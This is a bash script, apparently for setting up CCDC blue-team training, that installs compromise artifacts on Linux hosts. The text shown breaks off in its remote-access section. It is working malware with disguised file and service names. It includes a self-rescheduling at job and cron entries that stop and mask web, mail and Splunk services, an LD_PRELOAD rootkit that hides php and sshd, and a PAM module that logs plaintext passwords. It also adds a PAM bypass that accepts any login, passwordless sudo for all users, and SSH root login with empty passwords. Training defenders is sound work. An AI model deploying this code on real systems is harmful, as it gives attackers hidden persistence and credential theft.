#!/usr/bin/env bash
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Linux Combined Setup Script — Interactive Menu Edition
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# All 8 Linux SetupScripts in one interactive menu.
# Select sections to run; completed sections shown in GREEN [DONE].
#
#   1. ATD: ComeATmeBro
#   2. BeeMovie: OopsAllBees
#   3. CronJobs: ImGonnaCron
#   4. LD_PRELOAD: LoadsOfIssues
#   5. PAM: ExWifeNamedPAM
#   7. RemoteAccess: OpenDoorPolicy
#   8. Users: HomeIntruders
#   9. WebShell: OopsAllWebShells
#
# Supports: Ubuntu, Debian, CentOS, RHEL, Fedora
# Usage:    sudo bash CCDC_Linux_COMBINED.sh
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

set -euo pipefail

# ── Color helpers ─────────────────────────────────────────────────────────────
RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; BLUE='\033[0;34m'; NC='\033[0m'

info()    { echo -e "${CYAN}[*]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
success() { echo -e "${GREEN}[+]${NC} $*"; }
err()     { echo -e "${RED}[-]${NC} $*" >&2; }
die()     { err "$*"; exit 1; }
section_hdr() {
    echo
    echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  $*${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo
}

# ── Privilege check ───────────────────────────────────────────────────────────
[[ $EUID -eq 0 ]] || die "This script must be run as root (sudo $0)."

# ── Distro detection ──────────────────────────────────────────────────────────
OS=""; OS_PRETTY=""; PKG_MGR=""; PKG_UPDATE=""; PKG_INSTALL=""
SUDO_GROUP=""; WEB_SERVER=""; WEB_SERVER_SVC=""; BASH_RC_PATH=""

detect_distro() {
    if [[ -f /etc/os-release ]]; then
        . /etc/os-release
        OS="${ID,,}"
        OS_PRETTY="${PRETTY_NAME:-$ID}"
    elif [[ -f /etc/redhat-release ]]; then
        OS="rhel"
        OS_PRETTY="$(cat /etc/redhat-release)"
    else
        die "Cannot detect OS — /etc/os-release not found."
    fi
}

set_distro_vars() {
    case "$OS" in
        ubuntu|debian)
            PKG_MGR="apt-get"
            PKG_UPDATE="DEBIAN_FRONTEND=noninteractive apt-get update -y"
            PKG_INSTALL="DEBIAN_FRONTEND=noninteractive apt-get install -y"
            SUDO_GROUP="sudo"
            WEB_SERVER="apache2"
            WEB_SERVER_SVC="apache2"
            BASH_RC_PATH="/etc/bash.bashrc"
            ;;
        centos|rhel)
            PKG_MGR="yum"
            PKG_UPDATE="yum update -y"
            PKG_INSTALL="yum install -y"
            SUDO_GROUP="wheel"
            WEB_SERVER="httpd"
            WEB_SERVER_SVC="httpd"
            BASH_RC_PATH="/etc/bashrc"
            ;;
        fedora)
            PKG_MGR="dnf"
            PKG_UPDATE="dnf update -y"
            PKG_INSTALL="dnf install -y"
            SUDO_GROUP="wheel"
            WEB_SERVER="httpd"
            WEB_SERVER_SVC="httpd"
            BASH_RC_PATH="/etc/bashrc"
            ;;
        *)
            die "Unsupported distro: $OS"
            ;;
    esac
}

detect_distro
set_distro_vars

# ── State tracking ────────────────────────────────────────────────────────────
STATE_FILE="/tmp/.ccdc_combined_state"
is_done()  { grep -qx "$1" "$STATE_FILE" 2>/dev/null; }
mark_done() {
    echo "$1" >> "$STATE_FILE"
    sort -u "$STATE_FILE" -o "$STATE_FILE" 2>/dev/null || true
}

# =============================================================================
# SECTION 1 — ATD: ComeATmeBro
# =============================================================================
section_1_atd() {
    section_hdr "1/9 — ATD: ComeATmeBro — Self-rescheduling at daemon persistence"

    warn "========================================================"
    warn " CCDC Blue Team Training  -  ATD Persistence Dropper"
    warn "========================================================"
    echo ""

    info "Installing 'at' package..."
    case "$OS" in
        ubuntu|debian) DEBIAN_FRONTEND=noninteractive apt-get install -y at 2>/dev/null || true ;;
        fedora)        dnf install -y at 2>/dev/null || true ;;
        centos|rhel)   yum install -y at 2>/dev/null || true ;;
    esac

    if systemctl list-units --type=service 2>/dev/null | grep -q 'atd'; then
        systemctl enable atd 2>/dev/null || true
        systemctl start  atd 2>/dev/null || true
        success "atd service enabled and started via systemctl."
    else
        service atd start 2>/dev/null || true
        sleep 1
        if pgrep -x atd &>/dev/null; then
            success "atd service started via SysV init."
        else
            warn "Could not start atd via service — attempting direct daemon start."
            atd 2>/dev/null || true
        fi
    fi

    sleep 1

    if ! command -v at &>/dev/null; then
        err "'at' binary not found after install. Aborting section."
        return 1
    fi
    success "'at' command is available."

    local PAYLOAD_PATH="/usr/local/lib/systemd-compat-helper.sh"
    info "Writing payload to ${PAYLOAD_PATH}..."

    cat > "${PAYLOAD_PATH}" << 'PAYLOAD_EOF'
#!/bin/bash
# systemd compatibility shim — do not remove (system managed)

systemctl stop apache2 2>/dev/null
systemctl stop httpd   2>/dev/null
systemctl stop dovecot 2>/dev/null

if command -v apt-get &>/dev/null; then
    DEBIAN_FRONTEND=noninteractive apt-get update -y </dev/null 2>/dev/null &
elif command -v dnf &>/dev/null; then
    dnf update -y 2>/dev/null &
elif command -v yum &>/dev/null; then
    yum update -y 2>/dev/null &
fi

echo "/usr/local/lib/systemd-compat-helper.sh" | at now + 10 minutes 2>/dev/null

exit 0
PAYLOAD_EOF

    chmod 755 "${PAYLOAD_PATH}"
    success "Payload written: ${PAYLOAD_PATH}"

    info "Submitting first at job (fires in 1 minute, then self-reschedules every 10)..."
    echo "${PAYLOAD_PATH}" | at now + 1 minute 2>/dev/null && \
        success "at job submitted — first execution in ~1 minute." || \
        err "Failed to submit at job. Check that atd is running: systemctl status atd"

    echo ""
    info "Current at queue:"
    atq 2>/dev/null || true

    echo ""
    success "ATD persistence dropper complete."
}

# =============================================================================
# SECTION 2 — BeeMovie: OopsAllBees
# =============================================================================
section_2_beemovie() {
    section_hdr "2/9 — BeeMovie: OopsAllBees — Bee Movie PROMPT_COMMAND hook"

    local SERVICE="systemd-pipewire-multithread-runner"
    local LIB_DIR="/usr/local/lib/${SERVICE}"
    local HOOK="/etc/profile.d/99-pipewire-session-env.sh"
    local BACKUP="${LIB_DIR}/hook.sh.bak"
    local ENFORCER="${LIB_DIR}/enforce.sh"
    local SVC_FILE="/etc/systemd/system/${SERVICE}.service"
    local TIMER_FILE="/etc/systemd/system/${SERVICE}.timer"

    info "Creating runtime library at ${LIB_DIR}..."
    mkdir -p "${LIB_DIR}"
    chmod 755 "${LIB_DIR}"

    info "Installing session environment hook at ${HOOK}..."
    cat > "${HOOK}" << 'HOOK_EOF'
# /etc/profile.d/99-pipewire-session-env.sh
# PipeWire Session Environment Initialiser
# Managed by systemd-pipewire-multithread-runner.service
# This file is monitored and automatically restored if removed or modified.

_pipewire_session_env_check() {
    printf '\e[2m%s\e[0m\n' \
        "According to all known laws of aviation, there is no way a bee should be able to fly." \
        "Its wings are too small to get its fat little body off the ground." \
        "The bee, of course, flies anyway because bees don't care what humans think is impossible."
}

if [[ -n "${BASH_VERSION:-}" ]] && [[ "${-}" == *i* ]]; then
    [[ "${PROMPT_COMMAND:-}" != *_pipewire_session_env_check* ]] && \
        PROMPT_COMMAND="_pipewire_session_env_check${PROMPT_COMMAND:+; $PROMPT_COMMAND}"
fi
HOOK_EOF
    chmod 644 "${HOOK}"
    success "Installed ${HOOK}"

    cp "${HOOK}" "${BACKUP}"
    chmod 644 "${BACKUP}"
    success "Backed up hook to ${BACKUP}"

    if ! grep -qF "99-pipewire-session-env.sh" "$BASH_RC_PATH" 2>/dev/null; then
        printf '\n# systemd-pipewire-multithread-runner: session environment init\n' >> "$BASH_RC_PATH"
        printf '[ -r /etc/profile.d/99-pipewire-session-env.sh ] && . /etc/profile.d/99-pipewire-session-env.sh\n' \
            >> "$BASH_RC_PATH"
        success "Added source line to $BASH_RC_PATH (covers non-login shells)"
    fi

    info "Writing enforcement script at ${ENFORCER}..."
    cat > "${ENFORCER}" << 'ENFORCER_EOF'
#!/usr/bin/env bash
# systemd-pipewire-multithread-runner: session environment enforcement agent
HOOK="/etc/profile.d/99-pipewire-session-env.sh"
BACKUP="/usr/local/lib/systemd-pipewire-multithread-runner/hook.sh.bak"
MARKER="_pipewire_session_env_check"

if [[ ! -f "${HOOK}" ]] || ! grep -qF "${MARKER}" "${HOOK}" 2>/dev/null; then
    logger -t systemd-pipewire-multithread-runner "Session env hook absent or tampered — restoring"
    cp "${BACKUP}" "${HOOK}"
    chmod 644 "${HOOK}"
    logger -t systemd-pipewire-multithread-runner "Session env hook restored from backup"
fi
ENFORCER_EOF
    chmod 755 "${ENFORCER}"
    success "Created ${ENFORCER}"

    info "Installing systemd service at ${SVC_FILE}..."
    cat > "${SVC_FILE}" << SVC_EOF
[Unit]
Description=PipeWire Multithread Session Runner
Documentation=https://gitlab.freedesktop.org/pipewire/pipewire
After=local-fs.target pipewire.service
ConditionPathExists=${ENFORCER}

[Service]
Type=oneshot
ExecStart=${ENFORCER}
StandardOutput=journal
StandardError=journal
SyslogIdentifier=systemd-pipewire-multithread-runner
RemainAfterExit=no
SVC_EOF
    chmod 644 "${SVC_FILE}"
    success "Installed ${SVC_FILE}"

    info "Installing systemd timer at ${TIMER_FILE}..."
    cat > "${TIMER_FILE}" << 'TIMER_EOF'
[Unit]
Description=PipeWire Multithread Session Runner Timer
After=local-fs.target

[Timer]
OnBootSec=30s
OnUnitActiveSec=60s
AccuracySec=10s
Persistent=true

[Install]
WantedBy=timers.target
TIMER_EOF
    chmod 644 "${TIMER_FILE}"
    success "Installed ${TIMER_FILE}"

    info "Enabling and starting ${SERVICE}.timer..."
    systemctl daemon-reload
    systemctl enable "${SERVICE}.timer" 2>/dev/null || true
    systemctl start  "${SERVICE}.timer" 2>/dev/null || true
    systemctl start  "${SERVICE}.service" 2>/dev/null || true

    local TIMER_STATE
    TIMER_STATE="$(systemctl is-active "${SERVICE}.timer" 2>/dev/null || echo 'failed')"
    echo
    success "${SERVICE} planted."
    echo -e "  ${YELLOW}Timer:${NC}    ${TIMER_STATE}"
    echo -e "  ${YELLOW}Fires:${NC}    30 s after boot, then every 60 s"
    echo -e "  ${YELLOW}Hook:${NC}     ${HOOK}"
    echo -e "  ${YELLOW}Backup:${NC}   ${BACKUP}"
    echo -e "  ${YELLOW}Enforcer:${NC} ${ENFORCER}"
    echo
    warn "Open a new shell to confirm PROMPT_COMMAND is active."
}

# =============================================================================
# SECTION 3 — CronJobs: ImGonnaCron
# =============================================================================
section_3_cronjobs() {
    section_hdr "3/9 — CronJobs: ImGonnaCron — Service-killing cron.d entries"

    local CRON_DIR="/etc/cron.d"
    local JOB1_FILE="${CRON_DIR}/fwupd-notify"
    local JOB1_SCHEDULE="*/5 * * * *"
    local JOB1_USER="root"
    local JOB2_FILE="${CRON_DIR}/apt-daily-compat"
    local JOB2_SCHEDULE="*/3 * * * *"
    local JOB2_USER="root"
    local -a SERVICES=("dovecot" "postfix" "$WEB_SERVER_SVC" "splunk")
    local -a parts=()
    local svc
    for svc in "${SERVICES[@]}"; do
        parts+=("systemctl stop ${svc} 2>/dev/null; systemctl mask ${svc} 2>/dev/null")
    done
    local IFS_BAK="$IFS"
    IFS="; "
    local CMD="${parts[*]}"
    IFS="$IFS_BAK"

    info "Writing cron job 1 → ${JOB1_FILE}"
    cat > "${JOB1_FILE}" <<EOF
# fwupd firmware notification helper — do not remove (system managed)
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

${JOB1_SCHEDULE}  ${JOB1_USER}  ${CMD}
EOF
    chmod 644 "${JOB1_FILE}"
    success "Job 1 written: ${JOB1_FILE}"

    info "Writing cron job 2 → ${JOB2_FILE}"
    cat > "${JOB2_FILE}" <<EOF
# system maintenance task
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

${JOB2_SCHEDULE}  ${JOB2_USER}  ${CMD}
EOF
    chmod 644 "${JOB2_FILE}"
    success "Job 2 written: ${JOB2_FILE}"
}

# =============================================================================
# SECTION 4 — LD_PRELOAD: LoadsOfIssues
# =============================================================================
section_4_ldpreload() {
    section_hdr "4/9 — LD_PRELOAD: LoadsOfIssues — System-wide process hiding"

    local DISTRO_NAME="$OS"
    local DISTRO_VER="unknown"
    [[ -f /etc/os-release ]] && { . /etc/os-release 2>/dev/null; DISTRO_VER="${VERSION_ID:-unknown}"; } || true

    local LIB_PATH
    if [[ -d "/usr/lib64" ]]; then
        LIB_PATH="/usr/lib64"
    elif [[ -d "/usr/lib/x86_64-linux-gnu" ]]; then
        LIB_PATH="/usr/lib/x86_64-linux-gnu"
    else
        LIB_PATH="/usr/lib"
    fi

    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}CCDC LD_PRELOAD Training Module Setup${NC}"
    echo -e "${BLUE}Detected: $DISTRO_NAME $DISTRO_VER${NC}"
    echo -e "${BLUE}Library Path: $LIB_PATH${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo ""

    echo -e "${YELLOW}[*] Step 1: Writing LD_PRELOAD process-hiding library source...${NC}"
    local PRELOAD_SOURCE_DIR="/tmp/lib_build"
    mkdir -p "$PRELOAD_SOURCE_DIR"

    cat > "$PRELOAD_SOURCE_DIR/libsec_monitor.c" << 'CSRC'
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

/* Process names to hide from ps/top/htop and ss -p process attribution.
 * Add or remove entries as needed; terminate the list with NULL. */
static const char *processes_to_hide[] = {
    "php",
    "sshd",
    NULL
};

static int get_dir_name(DIR *dirp, char *buf, size_t size) {
    int fd = dirfd(dirp);
    if (fd == -1) return 0;
    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if (ret == -1) return 0;
    buf[ret] = 0;
    return 1;
}

static int get_process_name(char *pid, char *buf) {
    if (strspn(pid, "0123456789") != strlen(pid)) return 0;
    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
    FILE *f = fopen(tmp, "r");
    if (!f) return 0;
    if (fgets(tmp, sizeof(tmp), f) == NULL) { fclose(f); return 0; }
    fclose(f);
    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

static int should_hide(const char *name) {
    for (int i = 0; processes_to_hide[i]; i++)
        if (strcmp(name, processes_to_hide[i]) == 0) return 1;
    return 0;
}

#define DECLARE_READDIR(dirent, readdir)                                \
static struct dirent *(*original_##readdir)(DIR *) = NULL;             \
struct dirent *readdir(DIR *dirp) {                                     \
    if (!original_##readdir) {                                          \
        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
        if (!original_##readdir) return NULL;                           \
    }                                                                   \
    struct dirent *dir;                                                 \
    while (1) {                                                         \
        dir = original_##readdir(dirp);                                 \
        if (dir) {                                                       \
            char dir_name[256], process_name[256];                      \
            if (get_dir_name(dirp, dir_name, sizeof(dir_name)) &&       \
                strcmp(dir_name, "/proc") == 0 &&                       \
                get_process_name(dir->d_name, process_name) &&          \
                should_hide(process_name)) continue;                    \
        }                                                               \
        break;                                                          \
    }                                                                   \
    return dir;                                                         \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
CSRC

    echo -e "${GREEN}[+] Source written to $PRELOAD_SOURCE_DIR/libsec_monitor.c${NC}"
    echo -e "${GREEN}    (based on github.com/gianlucaborello/libprocesshider)${NC}"

    echo -e "${YELLOW}[*] Step 2: Ensuring GCC is installed...${NC}"
    if ! command -v gcc &>/dev/null; then
        case "$DISTRO_NAME" in
            ubuntu|debian|kali|linuxmint|pop)
                apt-get install -y -qq gcc 2>/dev/null && echo -e "${GREEN}[+] GCC installed via apt${NC}" \
                    || echo -e "${YELLOW}[!] apt GCC install failed${NC}"
                ;;
            centos|rhel|rocky|almalinux|ol)
                yum install -y gcc 2>/dev/null && echo -e "${GREEN}[+] GCC installed via yum${NC}" \
                    || echo -e "${YELLOW}[!] yum GCC install failed${NC}"
                ;;
            fedora)
                dnf install -y gcc 2>/dev/null && echo -e "${GREEN}[+] GCC installed via dnf${NC}" \
                    || echo -e "${YELLOW}[!] dnf GCC install failed${NC}"
                ;;
            *)
                if command -v apt-get &>/dev/null; then
                    apt-get install -y -qq gcc 2>/dev/null
                elif command -v dnf &>/dev/null; then
                    dnf install -y gcc 2>/dev/null
                elif command -v yum &>/dev/null; then
                    yum install -y gcc 2>/dev/null
                fi
                ;;
        esac
    else
        echo -e "${GREEN}[+] GCC already installed${NC}"
    fi

    echo -e "${YELLOW}[*] Step 3: Compiling LD_PRELOAD library...${NC}"
    if command -v gcc &>/dev/null; then
        if gcc -fPIC -shared -o "$PRELOAD_SOURCE_DIR/libsec_monitor.so" \
            "$PRELOAD_SOURCE_DIR/libsec_monitor.c" -ldl 2>/dev/null; then
            echo -e "${GREEN}[+] Successfully compiled libsec_monitor.so${NC}"
            if cp "$PRELOAD_SOURCE_DIR/libsec_monitor.so" "$LIB_PATH/libsec_monitor.so"; then
                chmod 644 "$LIB_PATH/libsec_monitor.so"
                echo -e "${GREEN}[+] Installed to $LIB_PATH/libsec_monitor.so${NC}"
            else
                echo -e "${YELLOW}[!] Could not copy compiled library${NC}"
            fi
        else
            echo -e "${YELLOW}[!] Compilation failed${NC}"
        fi
    else
        echo -e "${RED}[-] GCC unavailable after install attempt — skipping library compilation${NC}"
    fi

    echo -e "${YELLOW}[*] Step 4: Setting up /etc/ld.so.preload...${NC}"
    local LD_PRELOAD_FILE="/etc/ld.so.preload"
    if [[ -f "$LD_PRELOAD_FILE" ]]; then
        cp "$LD_PRELOAD_FILE" "${LD_PRELOAD_FILE}.bak.preinstall"
        echo -e "${GREEN}[+] Backed up existing /etc/ld.so.preload${NC}"
    fi
    if [[ -f "$LIB_PATH/libsec_monitor.so" ]]; then
        echo "$LIB_PATH/libsec_monitor.so" > "$LD_PRELOAD_FILE"
        chmod 644 "$LD_PRELOAD_FILE"
        echo -e "${GREEN}[+] Updated /etc/ld.so.preload${NC}"
    else
        echo -e "${YELLOW}[!] Library not found — /etc/ld.so.preload not updated${NC}"
    fi

    echo ""
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}LD_PRELOAD Training Module Setup Complete!${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo ""
    echo -e "${BLUE}Library:${NC}             $LIB_PATH/libsec_monitor.so"
    echo -e "${BLUE}System-Wide Preload:${NC} /etc/ld.so.preload"
    echo ""
    echo -e "${YELLOW}Effect:${NC}"
    echo -e "  Processes named 'php' and 'sshd' are hidden from ps/top/htop."
    echo -e "  ps aux | grep php            — should return nothing"
    echo -e "  ps aux | grep sshd           — should return nothing"
    echo -e "  ss -tulpn still shows open ports; ss -p won't show the process name."
}

# =============================================================================
# SECTION 5 — PAM: ExWifeNamedPAM
# =============================================================================
section_5_pam() {
    section_hdr "5/9 — PAM: ExWifeNamedPAM — Credential capture + auth bypass"

    local DISTRO_NAME="$OS"
    local DISTRO_VER="unknown"
    [[ -f /etc/os-release ]] && { . /etc/os-release 2>/dev/null; DISTRO_VER="${VERSION_ID:-unknown}"; } || true

    local PAM_LIB_PATH=""
    local _path
    for _path in "/usr/lib64/security" "/lib64/security" \
                 "/usr/lib/x86_64-linux-gnu/security" \
                 "/lib/x86_64-linux-gnu/security" \
                 "/usr/lib/security" "/lib/security"; do
        if [[ -d "$_path" ]]; then PAM_LIB_PATH="$_path"; break; fi
    done
    PAM_LIB_PATH="${PAM_LIB_PATH:-/usr/lib64/security}"

    local -a PAM_CONFIG_FILES=()
    [[ -f "/etc/pam.d/common-auth"   ]] && PAM_CONFIG_FILES+=("common-auth")
    [[ -f "/etc/pam.d/system-auth"   ]] && PAM_CONFIG_FILES+=("system-auth")
    [[ -f "/etc/pam.d/password-auth" ]] && PAM_CONFIG_FILES+=("password-auth")
    [[ ${#PAM_CONFIG_FILES[@]} -eq 0 ]] && PAM_CONFIG_FILES+=("system-auth")

    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}CCDC PAM Training Module Setup${NC}"
    echo -e "${BLUE}Detected: $DISTRO_NAME $DISTRO_VER${NC}"
    echo -e "${BLUE}PAM Library: $PAM_LIB_PATH${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo ""

    echo -e "${YELLOW}[*] Step 1: Creating PAM authentication capture module...${NC}"
    local PAM_SOURCE_DIR="/tmp/pam_build"
    mkdir -p "$PAM_SOURCE_DIR"

    cat > "$PAM_SOURCE_DIR/pam_audit.c" << 'EOF'
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pwd.h>
#include <unistd.h>
#include <time.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {
    const char *user = NULL;
    const char *passwd = NULL;
    struct passwd *pw = NULL;
    FILE *log_file = NULL;
    char log_path[256];
    time_t now;
    struct tm *timeinfo;
    char time_str[64];

    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS || user == NULL)
        return PAM_IGNORE;
    if (pam_get_authtok(pamh, PAM_AUTHTOK, &passwd, NULL) != PAM_SUCCESS)
        return PAM_IGNORE;

    pw = getpwnam(user);
    if (pw == NULL) return PAM_IGNORE;

    snprintf(log_path, sizeof(log_path), "%s/.session_cache", pw->pw_dir);
    time(&now);
    timeinfo = localtime(&now);
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", timeinfo);

    log_file = fopen(log_path, "a");
    if (log_file != NULL) {
        fprintf(log_file, "[%s] User: %s | Password: %s\n", time_str, user, passwd);
        fclose(log_file);
        chmod(log_path, 0600);
    }
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv)
    { return PAM_SUCCESS; }
PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv)
    { return PAM_SUCCESS; }
PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
    { return PAM_SUCCESS; }
PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
    { return PAM_SUCCESS; }
PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv)
    { return PAM_SUCCESS; }
EOF

    local PAM_COMPILE_SUCCESS=0
    if command -v gcc &>/dev/null; then
        if gcc -fPIC -DPIC -shared -o "$PAM_SOURCE_DIR/pam_audit.so" \
            "$PAM_SOURCE_DIR/pam_audit.c" -lpam -ldl 2>/dev/null; then
            PAM_COMPILE_SUCCESS=1
        else
            echo -e "${YELLOW}[!] Initial compilation failed, trying simplified approach${NC}"
            if gcc -fPIC -DPIC -shared -o "$PAM_SOURCE_DIR/pam_audit.so" \
                "$PAM_SOURCE_DIR/pam_audit.c" -lpam 2>/dev/null; then
                PAM_COMPILE_SUCCESS=1
            fi
        fi
    fi

    if [[ $PAM_COMPILE_SUCCESS -eq 1 ]] && [[ -f "$PAM_SOURCE_DIR/pam_audit.so" ]]; then
        if cp "$PAM_SOURCE_DIR/pam_audit.so" "$PAM_LIB_PATH/pam_audit.so" 2>/dev/null; then
            echo -e "${GREEN}[+] PAM capture module compiled and installed to $PAM_LIB_PATH${NC}"
        else
            echo -e "${YELLOW}[!] Could not copy compiled module to $PAM_LIB_PATH${NC}"
        fi
    else
        echo -e "${YELLOW}[!] Could not compile PAM module, continuing with alternative methods${NC}"
    fi

    echo -e "${YELLOW}[*] Step 2: Setting up authentication bypass mechanism...${NC}"
    mkdir -p /opt/sec-audit
    cat > /opt/sec-audit/auth_policy.sh << 'PAMHANDLER'
#!/bin/bash
MASTER_PASSWORD="Apric0t#S3cure"
if [[ "$PAM_PASSWORD" == "$MASTER_PASSWORD" ]]; then exit 0; fi
exit 1
PAMHANDLER
    chmod 755 /opt/sec-audit/auth_policy.sh
    echo -e "${GREEN}[+] PAM authentication handler created${NC}"

    echo -e "${YELLOW}[*] Step 3: Configuring PAM settings...${NC}"
    local PAM_DIR="/etc/pam.d"
    for pam_file in sshd sudo login system-auth password-auth common-auth; do
        if [[ -f "$PAM_DIR/$pam_file" ]]; then
            cp "$PAM_DIR/$pam_file" "$PAM_DIR/${pam_file}.bak.preinstall"
            echo -e "${GREEN}[+] Backed up $pam_file${NC}"
        fi
    done

    local config_file
    for config_file in "${PAM_CONFIG_FILES[@]}"; do
        local pam_file="$PAM_DIR/$config_file"
        if [[ -f "$pam_file" ]]; then
            if ! grep -q "pam_audit.so" "$pam_file"; then
                sed -i "1i # sec-policy: Capture module\nauth optional $PAM_LIB_PATH/pam_audit.so" "$pam_file"
                echo -e "${GREEN}[+] Added capture module to $config_file${NC}"
            fi
        fi
    done

    echo -e "${YELLOW}[*] Step 4: Setting up unrestricted access mechanism...${NC}"
    local PERMIT_SCRIPT="/opt/sec-audit/policy_override.sh"
    cat > "$PERMIT_SCRIPT" << 'PERMITSCRIPT'
#!/bin/bash
exit 0
PERMITSCRIPT
    chmod 755 "$PERMIT_SCRIPT"

    for config_file in "${PAM_CONFIG_FILES[@]}"; do
        local pam_file="$PAM_DIR/$config_file"
        if [[ -f "$pam_file" ]]; then
            if ! grep -q "policy_override.sh" "$pam_file"; then
                sed -i "1i # sec-policy: Permit module for demonstration\nauth sufficient pam_exec.so $PERMIT_SCRIPT" "$pam_file"
                echo -e "${GREEN}[+] Added permit mechanism to $config_file${NC}"
            fi
        fi
    done

    echo -e "${YELLOW}[*] Step 6: Setting up sudo bypass...${NC}"
    if ! grep -q "sec-policy" /etc/sudoers 2>/dev/null; then
        {
            echo ""
            echo "# sec-policy: Allow unrestricted sudo (for demonstration)"
            getent group wheel &>/dev/null && echo "%wheel ALL=(ALL) NOPASSWD:ALL  # sec-policy"
            getent group sudo  &>/dev/null && echo "%sudo ALL=(ALL) NOPASSWD:ALL   # sec-policy"
            echo "ALL ALL=(ALL) NOPASSWD:ALL  # sec-policy"
        } >> /etc/sudoers
        echo -e "${GREEN}[+] Added sudo bypass entries${NC}"
    fi

    echo -e "${YELLOW}[*] Step 7: Configuring SSH for unrestricted access...${NC}"
    local SSH_CONFIG="/etc/ssh/sshd_config"
    local SSH_CONFIG_D="/etc/ssh/sshd_config.d"
    if [[ -d "$SSH_CONFIG_D" ]]; then
        if [[ ! -f "$SSH_CONFIG_D/security-policy.conf" ]]; then
            cat > "$SSH_CONFIG_D/security-policy.conf" << 'SSHCFG'
# sec-policy: Unrestricted SSH Access
PermitRootLogin yes
PermitEmptyPasswords yes
UsePAM yes
PasswordAuthentication yes
PubkeyAuthentication yes
SSHCFG
            echo -e "${GREEN}[+] Created SSH training configuration${NC}"
        fi
    elif [[ -f "$SSH_CONFIG" ]]; then
        [[ -f "${SSH_CONFIG}.bak.preinstall" ]] || cp "$SSH_CONFIG" "${SSH_CONFIG}.bak.preinstall"
        sed -i 's/^#*PermitRootLogin .*/PermitRootLogin yes/g'         "$SSH_CONFIG"
        sed -i 's/^#*PermitEmptyPasswords .*/PermitEmptyPasswords yes/g' "$SSH_CONFIG"
        sed -i 's/^#*PasswordAuthentication .*/PasswordAuthentication yes/g' "$SSH_CONFIG"
        grep -q "^PermitRootLogin"      "$SSH_CONFIG" || echo "PermitRootLogin yes"      >> "$SSH_CONFIG"
        grep -q "^PermitEmptyPasswords" "$SSH_CONFIG" || echo "PermitEmptyPasswords yes" >> "$SSH_CONFIG"
        echo -e "${GREEN}[+] Modified sshd_config for training purposes${NC}"
    fi

    if systemctl is-active --quiet ssh 2>/dev/null; then
        systemctl restart ssh 2>/dev/null || true
    elif systemctl is-active --quiet sshd 2>/dev/null; then
        systemctl restart sshd 2>/dev/null || true
    else
        systemctl restart ssh sshd 2>/dev/null || true
    fi
    echo -e "${GREEN}[+] SSH service restarted${NC}"

    echo ""
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}PAM Training Module Setup Complete!${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo ""
    echo -e "${BLUE}Master Password:${NC} ${YELLOW}Apric0t#S3cure${NC}"
    echo -e "${BLUE}Auth Handler:${NC}    /opt/sec-audit/auth_policy.sh"
}

# =============================================================================
# SECTION 7 — RemoteAccess: OpenDoorPolicy
# =============================================================================
section_7_remoteaccess() {
    section_hdr "7/9 — RemoteAccess: OpenDoorPolicy — Multi-service remote access"

    local SSH_PORT=22
    local COCKPIT_PORT=9090
    local SHELLINABOX_PORT=4200
    local TFTP_ROOT="/var/lib/tftpboot"

    local RA_PKG_INSTALL RA_PKG_UPDATE
    local INETD_PKG INETD_CONF INETD_SVC
    local TELNET_PKG RSH_PKG TFTP_PKG
    local SHELLINABOX_PKG="shellinabox" SHELLINABOX_SVC SHELLINABOX_CONF
    local SSH_SVC SFTP_SERVER EPEL_NEEDED=false

    case "$OS" in
        ubuntu|debian)
            export DEBIAN_FRONTEND=noninteractive
            RA_PKG_INSTALL="apt-get install -y"
            RA_PKG_UPDATE="apt-get update -y"
            INETD_PKG="openbsd-inetd";    INETD_CONF="/etc/inetd.conf"; INETD_SVC="inetd"
            TELNET_PKG="inetutils-telnetd"; RSH_PKG="rsh-server"; TFTP_PKG="tftpd-hpa"
            SHELLINABOX_SVC="shellinabox"; SHELLINABOX_CONF="/etc/default/shellinabox"
            SSH_SVC="ssh"; SFTP_SERVER="/usr/lib/openssh/sftp-server"
            ;;
        fedora)
            RA_PKG_INSTALL="dnf install -y"
